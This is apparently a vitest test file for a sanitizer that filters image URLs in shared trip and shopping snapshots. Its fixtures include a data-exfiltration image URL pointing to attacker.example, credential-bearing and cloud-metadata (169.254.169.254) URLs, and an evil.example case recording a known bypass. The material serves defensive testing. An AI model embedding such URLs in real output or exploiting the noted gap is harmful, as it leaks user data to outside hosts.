import { describe, it, expect } from 'vitest'
import { publicImagePolicy, buildPublicPayload, isPublicImage, isPublicPlanPhoto } from './publicSanitizer'
import type { SharedResultPayload } from './sharedResult'

// Gate 2 G3 (G3-ADDENDUM.md + G3-DECISIONS.json) — the public image policy, layers 1 and 3 (H-open).
// Layer 1: plan photos follow R1 and the photos R1 rejects never come back through `images`.
// Layer 3 (H-open): other public images keep a safe public https URL; NO host allow-list (G-T11 pins the recorded residual).

const EXFIL = 'https://attacker.example/p?d=QuanBinhThanh'
const TBN = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTstop'
const HERO = 'https://cdn.example/hero.jpg'
const SHOP = 'https://cdn.example/shop.jpg'

const OLD: SharedResultPayload = {
  v: 1, title: 'Đà Lạt 2 ngày', query: 'lên kế hoạch Đà Lạt', domain: 'travel', locale: 'vi', body: 'Kế hoạch.', buttons: [],
  images: [EXFIL, HERO, TBN], suggestedQuestions: [], createdAt: '2026-10-01T00:00:00.000Z',
  plan: { type: 'trip', title: 'Đà Lạt 2 ngày', people: 2, budget_total: '', days: [
    { label: 'Ngày 1', items: [
      { time: '08:00', emoji: '🍜', category: 'food', name: 'Quán A', description: '', price: '', photo_url: EXFIL },
      { time: '10:00', emoji: '🏞️', category: 'attraction', name: 'Hồ', description: '', price: '', photo_url: TBN },
    ] },
  ] },
} as unknown as SharedResultPayload

describe('G3 · publicImagePolicy', () => {
  it('G-T1 · old snapshot: the plan photo R1 rejects is removed from the plan AND from images; the rest stays in order', () => {
    const out = publicImagePolicy(OLD)
    expect(JSON.stringify(out)).not.toContain('attacker.example')
    expect(out.images).toEqual([HERO, TBN])
    const items = out.plan!.days[0].items as unknown as Array<Record<string, unknown>>
    expect(items[0]).not.toHaveProperty('photo_url')
    expect(items[1].photo_url).toBe(TBN)
  })

  it('G-T2 · new snapshot (write time): buildPublicPayload never stores the rejected plan photo, in the plan or in images', () => {
    const reply = `Kế hoạch nè.\n\n![Ảnh](${HERO})\n\n[TAPPY_PLAN]` + JSON.stringify({ type: 'trip', title: 'Đà Lạt', days: [{ label: 'Ngày 1', items: [
      { time: '08:00', emoji: '🍜', category: 'food', name: 'Quán A', photo_url: EXFIL },
      { time: '10:00', emoji: '🏞️', category: 'attraction', name: 'Hồ', photo_url: TBN },
    ] }] }) + '[/TAPPY_PLAN]'
    const p = buildPublicPayload({ userQuery: 'lên kế hoạch Đà Lạt', assistantContent: reply, domain: 'travel', locale: 'vi', createdAt: new Date('2026-10-01T00:00:00Z') })
    expect(JSON.stringify(p)).not.toContain('attacker.example')
    expect(p.images).toContain(TBN)
    expect(p.images).toContain(HERO)
    expect((p.plan!.days[0].items as unknown as Array<Record<string, unknown>>)[1].photo_url).toBe(TBN)
  })

  it('G-T3 · valid images are kept byte for byte (H-open: any safe public https host stays)', () => {
    const withShop = { ...OLD, shopping: { v: 1, entities: [{ key: 'k', name: 'X', config: 'X', specs: [], condition: null, matchesRequest: 'khop', recommended: true, priceLow: null, priceHigh: null, image: SHOP, offers: [] }], recommendation: null } } as unknown as SharedResultPayload
    const out = publicImagePolicy(withShop)
    expect(out.images).toEqual([HERO, TBN])
    expect(out.shopping!.entities[0].image).toBe(SHOP)
    expect(isPublicImage(HERO)).toBe(true)
    expect(isPublicPlanPhoto(TBN)).toBe(true)
  })

  it('G-T3b · layer 3 still refuses unsafe forms the snapshot writer would store (credentials, private IP literal)', () => {
    const odd = { ...OLD, plan: undefined, images: ['https://u:p@cdn.example/a.jpg', 'https://169.254.169.254/a.jpg', HERO],
      shopping: { v: 1, entities: [{ key: 'k', name: 'X', config: 'X', specs: [], condition: null, matchesRequest: 'khop', recommended: true, priceLow: null, priceHigh: null, image: 'https://169.254.169.254/s.jpg', offers: [] }], recommendation: null },
      places: { v: 1, items: [{ name: 'P', image: 'https://u:p@cdn.example/p.jpg' }, { name: 'Q', image: HERO }] } } as unknown as SharedResultPayload
    const out = publicImagePolicy(odd)
    expect(out.images).toEqual([HERO])
    expect(out.shopping!.entities[0].image).toBeNull()
    expect(out.places!.items[0]).not.toHaveProperty('image')
    expect(out.places!.items[1].image).toBe(HERO)
  })

  it('G-T10 · structure: only image fields change; nothing to change = the very same object; input not mutated', () => {
    const out = publicImagePolicy(OLD)
    const strip = (p: SharedResultPayload) => ({ ...p, images: undefined, plan: undefined })
    expect(strip(out)).toEqual(strip(OLD))
    expect(out.plan!.days.map(d => d.items.length)).toEqual([2])
    expect(OLD.images).toEqual([EXFIL, HERO, TBN])
    const clean = { ...OLD, images: [HERO, TBN], plan: { ...OLD.plan!, days: [{ label: 'Ngày 1', items: [{ name: 'Hồ', photo_url: TBN }] }] } } as unknown as SharedResultPayload
    expect(publicImagePolicy(clean)).toBe(clean)
  })

  it('G-T11 · RESIDUAL (H-open, not a gate): an https image inside a forged shopping block of an OLD message still passes', () => {
    const forged = { ...OLD, plan: undefined, images: ['https://evil.example/s.jpg'],
      shopping: { v: 1, entities: [{ key: 'k', name: 'X', config: 'X', specs: [], condition: null, matchesRequest: 'khop', recommended: true, priceLow: null, priceHigh: null, image: 'https://evil.example/s.jpg', offers: [] }], recommendation: null } } as unknown as SharedResultPayload
    const out = publicImagePolicy(forged)
    // Layer 3 is a URL policy, not provenance: the snapshot cannot tell a forged block from the server's in stored text.
    expect(out.shopping!.entities[0].image).toBe('https://evil.example/s.jpg')
    expect(out.images).toEqual(['https://evil.example/s.jpg'])
  })
})
